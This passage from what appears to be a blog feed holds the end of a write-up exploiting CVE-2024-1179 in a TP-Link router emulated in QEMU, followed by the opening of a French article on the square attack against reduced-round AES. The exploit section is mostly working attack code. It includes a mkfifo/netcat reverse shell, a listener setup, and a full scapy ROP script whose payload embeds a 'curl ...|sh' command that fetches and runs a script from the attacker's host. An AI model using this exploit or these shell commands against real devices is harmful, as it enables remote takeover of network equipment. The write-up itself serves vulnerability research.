<p>But as <code>netcat</code> is installed, we opt for a reverse shell based on <code>mkfifo</code>  which we get from <a href="https://podalirius.net/fr/articles/unix-reverse-shells-cheatsheet/#new-netcat">here</a>. We replace the redirection of stderr to stdout (<code>2&gt;&amp;1</code>) with a redirection from socket file descriptor number 3 to stdout (<code>3&gt;&amp;1</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>mkfifo /tmp/f;nc 10.212.81.52 <span style="color:#ae81ff">4444</span> 0&lt;/tmp/f|/bin/sh -i 3&gt;&amp;1|tee /tmp/f
</span></span></code></pre></div><p>The bash file will be hosted in our host machine. So we use python HTTP server to host this file, named <code>x</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8888</span>
</span></span></code></pre></div><p>and then is another terminal we start a <code>netcat</code> listener:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>And boom !! We have a reverse shell !!!!</p>
<p>On Qemu WM side we have this.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174844.png"/><figcaption><h4> </h4></figcaption></figure>
<p>And on our host machine listener terminal:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174829.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Great. The complete exploitation script is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.layers.inet6 <span style="color:#f92672">import</span> IPv6, UDP
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.layers.dhcp6 <span style="color:#f92672">import</span> DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        inet 10.212.81.52  netmask 255.255.0.0  broadcast 10.212.255.255
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        inet6 fe80::542b:76ce:631b:36ce  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ether da:30:2c:48:59:a8  txqueuelen 1000  (Ethernet)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        RX packets 652899  bytes 434959083 (434.9 MB)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        RX errors 0  dropped 0  overruns 0  frame 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        TX packets 284487  bytes 81342637 (81.3 MB)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>target_mac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;00:11:22:33:44:55&#34;</span>  <span style="color:#75715e"># qemu </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>br0_mac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;da:30:2c:48:59:a8&#34;</span>
</span></span><span style="display:flex;"><span>br0_link_local_inet6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fe80::542b:76ce:631b:36ce&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_solicit_msg</span>(pkt):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pkt<span style="color:#f92672">.</span>haslayer(DHCP6_Solicit) <span style="color:#f92672">and</span> pkt[Ether]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> target_mac
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_dhcp6_advertise</span>(p):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style="display:flex;"><span>    src_mac <span style="color:#f92672">=</span> br0_mac  <span style="color:#75715e"># Bridge interface MAC address</span>
</span></span><span style="display:flex;"><span>    dst_mac <span style="color:#f92672">=</span> p[Ether]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s MAC address from original packet</span>
</span></span><span style="display:flex;"><span>    ethernet_layer <span style="color:#f92672">=</span> Ether(src<span style="color:#f92672">=</span>src_mac, dst<span style="color:#f92672">=</span>dst_mac)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style="display:flex;"><span>    ipv6_dst <span style="color:#f92672">=</span> p[IPv6]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s IPv6 address from original packet</span>
</span></span><span style="display:flex;"><span>    ipv6_src <span style="color:#f92672">=</span> br0_link_local_inet6  <span style="color:#75715e"># Bridge interface link-local address</span>
</span></span><span style="display:flex;"><span>    ipv6_layer <span style="color:#f92672">=</span> IPv6(src<span style="color:#f92672">=</span>ipv6_src, dst<span style="color:#f92672">=</span>ipv6_dst)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Port 547: Server port, Port 546: Client port</span>
</span></span><span style="display:flex;"><span>    udp_layer <span style="color:#f92672">=</span> UDP(sport<span style="color:#f92672">=</span><span style="color:#ae81ff">547</span>, dport<span style="color:#f92672">=</span><span style="color:#ae81ff">546</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style="display:flex;"><span>    client_duid <span style="color:#f92672">=</span> p[DHCP6OptClientId]<span style="color:#f92672">.</span>duid
</span></span><span style="display:flex;"><span>    trid <span style="color:#f92672">=</span> p[DHCP6_Solicit]<span style="color:#f92672">.</span>trid
</span></span><span style="display:flex;"><span>    dhcp6_advertise <span style="color:#f92672">=</span> DHCP6_Advertise(trid<span style="color:#f92672">=</span>trid)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create DHCPv6 options</span>
</span></span><span style="display:flex;"><span>    client_id <span style="color:#f92672">=</span> DHCP6OptClientId(duid<span style="color:#f92672">=</span>client_duid)  <span style="color:#75715e"># Client Identifier option</span>
</span></span><span style="display:flex;"><span>    server_id <span style="color:#f92672">=</span> DHCP6OptServerId(duid<span style="color:#f92672">=</span>DUID_LLT(hwtype<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, lladdr<span style="color:#f92672">=</span>src_mac))  <span style="color:#75715e"># Server Identifier option</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># AFTR_NAME option</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &gt;&gt;&gt; hex(63) == &#39;0x3f&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x40</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># aftr_name: size + string + size + string + ... +</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#payload = (b&#39;\x30&#39; + b&#39;a&#39; * 0x30) * 10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0041317c</span>
</span></span><span style="display:flex;"><span>    w_region <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42a600</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    gadget1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040c4ac</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>  <span style="color:#75715e">## strcpy</span>
</span></span><span style="display:flex;"><span>    gadget2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40c396</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>    <span style="color:#75715e"># memcpy</span>
</span></span><span style="display:flex;"><span>    gadget3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40a8b6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>    <span style="color:#75715e"># execve</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">417</span> <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">+</span> p32(gadget1) <span style="color:#75715e"># here s0 at offset 417 need to be valid address</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;curl http://10.212.81.52:8888/x|sh;#&#39;</span> <span style="color:#75715e">## our command (source content)</span>
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">120</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        -&gt; 0x40c4bb e870                &lt;NO_SYMBOL&gt;   jrc    ra 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x40c4bd 5e41                &lt;NO_SYMBOL&gt;   sltiu  a2, 112 	Maybe delay-slot
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>) <span style="color:#75715e">## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> p32(gadget2)  <span style="color:#75715e"># ## next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">132</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>    p1<span style="color:#f92672">+=</span> p32(w_region)  <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>            <span style="color:#75715e">## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length</span>
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-c</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">## -c strings</span>
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">84</span><span style="color:#f92672">-</span>len(p2)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>)   
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">+=</span> p32(gadget3)    <span style="color:#75715e">### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;babe&#39;</span>
</span></span><span style="display:flex;"><span>    p2<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># destination pointer </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">+=</span> p32(binsh_addr) <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">+</span> p32(w_region) <span style="color:#75715e"># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0</span>)  <span style="color:#75715e"># a2 = NULL = envp</span>
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">128</span><span style="color:#f92672">-</span>len(p3))
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">+=</span> p32(binsh_addr)    <span style="color:#75715e">#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>    p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">358</span><span style="color:#f92672">-</span>len(p3)<span style="color:#f92672">-</span>len(p2) <span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">+</span> p1 <span style="color:#f92672">+</span> p2 <span style="color:#f92672">+</span> p3
</span></span><span style="display:flex;"><span>    aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#af = code + b&#39;\x30&#39;*1000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x0e</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    rapid_commit_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Combine all layers and send packet</span>
</span></span><span style="display:flex;"><span>    pck <span style="color:#f92672">=</span> ethernet_layer <span style="color:#f92672">/</span> ipv6_layer <span style="color:#f92672">/</span> udp_layer <span style="color:#f92672">/</span> dhcp6_advertise <span style="color:#f92672">/</span> server_id <span style="color:#f92672">/</span> client_id <span style="color:#f92672">/</span> aftr_name_option <span style="color:#f92672">/</span> rapid_commit_option
</span></span><span style="display:flex;"><span>    print(pck)
</span></span><span style="display:flex;"><span>    sendp(pck, iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;br0&#34;</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>interface <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;br0&#39;</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> sniff(iface<span style="color:#f92672">=</span>interface, filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;udp and port 546&#34;</span>, prn<span style="color:#f92672">=</span>send_dhcp6_advertise, lfilter<span style="color:#f92672">=</span>filter_solicit_msg)
</span></span></code></pre></div><p>The <code>x</code> file contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>mkfifo /tmp/f;nc 10.212.81.52 <span style="color:#ae81ff">4444</span> 0&lt;/tmp/f|/bin/sh -i 3&gt;&amp;1|tee /tmp/f
</span></span></code></pre></div><h2 id="conclusion">Conclusion<a href="#conclusion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>This analysis demonstrates a reliable exploitation path for <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1179">CVE-2024-1179</a></strong>. While the attack requires some knowledge of MIPS architecture and bypass of standard OS protections, this vulnerability is fairly easy to weaponize. We successfully achieve a remote code execution from the WAN side of the router. This vulnerability highlights the importance of rigorous bounds checking on all user-controlled input, enabling compiler security features , following secure coding guidelines for buffer management etc. It also emphasizes how critical proper security practices are, especially in network infrastructure devices where vulnerabilities can have significant consequences.</p>
<h2 id="references">References<a href="#references" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1179">https://nvd.nist.gov/vuln/detail/CVE-2024-1179</a></p>
<p><a href="https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/">https://www.z1r0.top/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/</a></p>
<p><a href="https://blog.compass-security.com/2024/08/a-patchdiffing-journey-tp-link-omada/">https://blog.compass-security.com/2024/08/a-patchdiffing-journey-tp-link-omada/</a></p>
<p><a href="https://diffing.quarkslab.com/tutorials/04c_firmware_diffing.html">https://diffing.quarkslab.com/tutorials/04c_firmware_diffing.html</a></p>
<p><a href="https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/">https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/</a></p>
<p><a href="https://cve-north-stars.github.io/docs/Root-Cause-Analysis">https://cve-north-stars.github.io/docs/Root-Cause-Analysis</a></p>
<p><a href="https://github.com/clearbluejar/ghidriff">https://github.com/clearbluejar/ghidriff</a></p>
<p><a href="https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d">https://stackoverflow.com/questions/66544765/how-and-when-openwrts-procd-runs-init-scripts-in-etc-init-d</a></p>
<p><a href="https://forum.turris.cz/t/etc-init-d-rcs-is-missing-what-gives/4745">https://forum.turris.cz/t/etc-init-d-rcs-is-missing-what-gives/4745</a></p>
<p><a href="https://blahcat.github.io/2017-07-14-building-a-debian-stretch-qemu-image-for-mipsel/">https://blahcat.github.io/2017-07-14-building-a-debian-stretch-qemu-image-for-mipsel/</a></p>
<p><a href="http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/">http://archive.debian.org/debian/dists/jessie/main/installer-mipsel/current/images/malta/netboot/</a>
<a href="http://archive.debian.org/debian">http://archive.debian.org/debian</a></p>
]]></content></item><item><title>Cryptanalyse intégrale sur AES à tours réduits: l'attaque dite carrée</title><link>https://dilagluc.github.io/en/posts/2023/crypto/aes/square-attack-aes/</link><pubDate>Wed, 19 Jul 2023 02:08:37 +0200</pubDate><author>dilag</author><guid>https://dilagluc.github.io/en/posts/2023/crypto/aes/square-attack-aes/</guid><description>square attack on reduced AES rounds</description><content type="text/html" mode="escaped"><![CDATA[<p>Dans l&rsquo;article <a href="/blog/2023/crypto/aes/intro">Chiffrement AES - Introduction</a> , on a eu à étudier et comprendre le fonctionnement du chiffrement AES. On se pose maintenant la question de savoir quelles sont les attaques possibles sur ce chiffrement. Dans cet article, nous étudierons l&rsquo;attaque dite carrée sur un AES à tours réduits.</p>
<h2 id="introduction">Introduction<a href="#introduction" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>La cryptanalyse intégrale est une technique de cryptanalyse applicable sur les chiffrements par blocs basés sur un réseau de substitution-permutation. Elle a été conçu pour la première fois pour attaquer un chiffrement du nom de <strong>SQUARE</strong> (d&rsquo;où le nom square attack), mais fut plus tard généralisée à d&rsquo;autres algorithmes de chiffrement qui ne sont pas de type <strong>SQUARE</strong>.  Elle est plus généralement connu sous le nom d&rsquo;attaque carrée (square attack).<br>
La cryptanalyse intégrale utilise un ensemble ou plusieurs ensembles de clairs choisis dont une partie reste constante et l&rsquo;autre partie varie couvrant toutes les possibilités.<br>
On verra dans la suite comment fonctionne ce type d&rsquo;attaque sur un chiffrement AES à tours réduits.</p>
<h2 id="lattaque-carrée">L&rsquo;attaque carrée<a href="#lattaque-carr%c3%a9e" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Comme dit précédemment cette attaque avait été conçu pour attaquer le chiffrement <strong>Square</strong>.
<strong>Square</strong> est une construction itérative de chiffrement par bloc. Chaque bloc<br>
contient \(128\) bits et est constitué de \(16\) octets rangés dans un tableau de taille<br>
\(16\) (soit un octet dans chaque case). La fonction de tour correspondante est<br>
constituée de quatre transformations élémentaires :<br>
<strong>- Linear Transformation</strong><br>
C’est une transformation linéaire qui opère séparément sur toutes les lignes<br>
d’un état (state en AES).  On peut correspondre cette transformation à un MixColumns<br>
<strong>- Nonlinear Transformation</strong><br>
C&rsquo;est une  transformation non linéaire qui  opère sur chaque octet séparément.
On peut la correspondre au SubBytes ou la Sbox en AES.<br>
<strong>- Byte Permutation</strong><br>
Cette permutation correspond à une transposition qui appliquée à un tableau<br>
d’octets échange les lignes et les colonnes.  On peut la correspondre au ShiftRows de l’AES.<br>
<strong>- Bitwise RoundKey Addition</strong><br>
Comme son nom l’indique, c’est une addition bit à bit avec la<br>
sous-clé de tour. On peut la correspondre à un  AddRoundKey de l’AES.<br>
L’attaque carré fonctionne sur les chiffrements qui possèdent  une structure dite carrée inspirée du chiffrement ci-dessus, mais pas que car elle fut plus tard généralisé aux chiffrements ne possédant pas cette structure. Cependant elle reste valable pour l’AES car il hérite de nombreuses propriétés du chiffrement Square.</p>
<h2 id="principe-de-lattaque">Principe de l&rsquo;attaque<a href="#principe-de-lattaque" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<p>Nous allons nous baser sur ce qui est décrit <a href="https://www.davidwong.fr/blockbreakers/square_1_3rounds.html">ici</a> pour expliquer l&rsquo;attaque.<br>
L’attaque square est dite CPA (chosen-plaintext attack) ou encore à clair choisi. L’objectif de l’attaque est de retrouver intégralement la clé et donc de casser l’AES à 4 tours puis à 5. La fonction qui produit les sous-clés à partir de la clé initiale étant inversible, retrouver une sous-clé permet de remonter jusqu’à la clé initiale. L&rsquo;attaque permet de retrouver la dernière sous-clé (utilisée dans le dernier tour) afin de casser le chiffrement.</p>
<h4 id="lambda-set">\(\Lambda\)-set<a href="#lambda-set" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Considérons un ensemble de 256 textes en clairs où on choisit un indice sur toutes ces 256 états et qu&rsquo;on lui fait prendre toutes les valeurs possibles d&rsquo;un octet (de 0x00 à 0xff) et on laisse tous les autres indice à 0x00. On appellera ce genre d&rsquo;ensemble un <strong>\(\Lambda\)-set</strong> (on dit delta-set, ne me demandez pas pourquoi c&rsquo;est pas lambda-set :)). L&rsquo;indice qui prend toutes les valeurs possibles est dit <strong>actif</strong>. Plus généralement, soit \(\Lambda\)-set un ensemble de 256 états différents présentée sous forme de matrice \(4 \times 4\). Représentons par \(x_{ij}\) l’octet d’indice \((i; j)\) ( \(i^{ème}\) ligne et à la \(j^{ème}\) colonne )  de  \(x \in \Lambda\)-set.
L&rsquo;octet d&rsquo; indice \((i; j)\) est dit <strong>actif</strong>, si tous les octets de cet indice de tous les états d’un même \(\Lambda\)-set, sont différents deux-à-deux. L&rsquo;octet d&rsquo;indice \((i; j)\) est dit <strong>passif</strong>, s’il est le même pour tous les états. Soit \(\lambda\) l’ensemble des indices des octets dits actif, alors un \(\Lambda\)-set est défini comme suit :<br>
</p>
$$
\forall x, y \in \Lambda,
\begin{cases}
x_{ij} \neq y_{ij} &\text{si } (i,j) \in \Lambda \\\\
x_{ij} = y_{ij} &\text{sinon }
\end{cases}
$$
<h4 id="structure-persistante-sur-3-tours">Structure persistante sur 3 tours<a href="#structure-persistante-sur-3-tours" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>L’application de SubBytes, AddRoundKey ou ShiftRows sur un \(\Lambda\)-set donne un autre \(\Lambda\)-set avec les indices des octets actifs inchangés. L’application de MixColumns n’aboutit pas nécessairement à un \(\Lambda\)-set. Mais, une colonne d’entrée avec un seul octet actif donne une colonne de sortie avec quatre octets actifs.</p>
<ul>
<li>AddRoundKey


    <figure><img src="https://dilagluc.github.io/crypto_aes/delta_AddRoundKey.png"/></figure></li>
<li>SubBytes


    <figure><img src="https://dilagluc.github.io/crypto_aes/delta_SubBytes.png"/></figure></li>
<li>ShiftRows


